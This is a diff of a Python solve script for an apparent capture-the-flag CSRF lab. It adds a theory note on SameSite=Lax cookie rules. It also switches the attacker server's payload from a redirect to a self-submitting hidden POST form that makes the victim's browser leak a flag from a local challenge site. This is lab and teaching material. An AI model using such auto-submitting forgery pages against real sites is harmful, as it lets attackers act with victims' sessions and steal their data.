@@ -2,26 +2,28 @@ import os
 import re
 import requests
 import signal
-from flask import Flask, request, redirect
+from flask import Flask
 
 
 """
 Theory:
-	server does login/session then makes get request
-	same origin check: not same origin => only simple get, post, head
-	checks out since browser does get
+	A cross site request forgery attack is an attack, that is based on a user
+	already logged in to the site you want to attack. In the case of this challenge
+	the login/authentication happens when requesting to /visit endpoint. The login creates
+	a session cookie that is stored by the browser. From now on the browser can send along this cookie
+	with any request made from the browser. This is a huge security issue.
 
-	same site check: not same site and not a navigational event, since browser get expects hacker.localhost
-	=> session cookies will not be sent along
+	To mitigate this issue, certain rules exist, based on which the browser decides when to send along cookies.
+	This is especially important for requests made by a document or script loaded by one origin.
+	Per default a browser sends along cookies with any request of this type, that originates and goes to the same origin and same site.
 
-	we send back a redirect to the leak enpoint at challenge.localhost
-	the browser attempts redirect from hacker.localhost/ to challenge.localhost/leak
-	same origin check: not same origin => only simple get, post, head
-	same site check: not same site but a redirect is treated as a navigational event
-	=> browser sends along session cookie
+	origin = (scheme, host, port), site = effective top level domain + 1
 
-	alternatively to a redirect we could have also created an html link and triggered it via js, since
-	using a link is also treated as a navigational event
+	After we receive the initial cookie via login, the browser checks weather any further requests to http://challenge.localhost
+	are made from one of the challenge.localhost sites (same origin, same site) or from another site i.e. hacker.localhost (cross origin, cross site).
+
+	In the challenge the default cookie policy lax is used. This means cookies are only send along with cross site requests, from hacker.localhost to
+	challenge.localhost, if the request is done as a navigational event like a link, form, redirect.
 
     db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                 'SELECT "flag" AS username, ? as password, ? as leak'),
@@ -42,7 +44,7 @@ Theory:
 
         return form(["username", "password"])
 
-    if request.path == "/leak":
+    if request.path == "/leak" and request.method == "POST":
         user_id = int(session.get("user", -1))
         user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
         assert user, "Not logged in"
@@ -90,7 +92,7 @@ Theory:
 """
 
 
-pat0 = re.compile(r".*Now running the web server:\n")
+pat0 = re.compile(".*Now running the web server:\n")
 r_pipe1, w_pipe1 = os.pipe()
 
 pid = os.fork()
@@ -123,9 +125,14 @@ if pid == 0:
 
 	@app.route('/')
 	def csrf_leak():
-		return redirect("http://challenge.localhost:80/leak")
+		return """
+		<form action="http://challenge.localhost:80/leak" method="POST">
+		<button id=leak></button>
+		<script>document.getElementById("leak").click();</script>
+		</form>
+		"""
 
-	app.run("hacker.localhost", 30080)
+	app.run("hacker.localhost", 30080, use_reloader=False)
 
 os.close(w_pipe1)
 
@@ -134,13 +141,14 @@ output = os.fdopen(r_pipe1, "r")
 while True:
 	line = output.readline()
 	print(line, end="")
+
 	m = pat0.match(line)
 	if m:
 		url = "http://challenge.localhost:80/visit"
 		data = {"url": "http://hacker.localhost:30080/"}
-		r = requests.get(url, params=data)
+		requests.get(url, params=data)
 		url = "http://challenge.localhost:80/info"
 		data = {"user": "1"}
 		r = requests.get(url, params=data)
 		print(r.text)
-		break
+		os.kill(pid, signal.SIGKILL)
